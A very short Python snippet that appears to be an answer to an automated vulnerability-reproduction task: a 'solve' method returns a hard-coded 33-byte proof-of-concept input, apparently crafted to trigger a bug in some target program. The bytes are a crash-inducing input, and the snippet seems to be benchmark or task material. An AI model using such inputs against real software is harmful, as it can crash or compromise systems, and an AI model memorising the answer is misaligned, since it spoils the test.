class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b'\x02\x20\x00\x40\x00\x00\x00\x00' + b'\x00' * 25
        return poc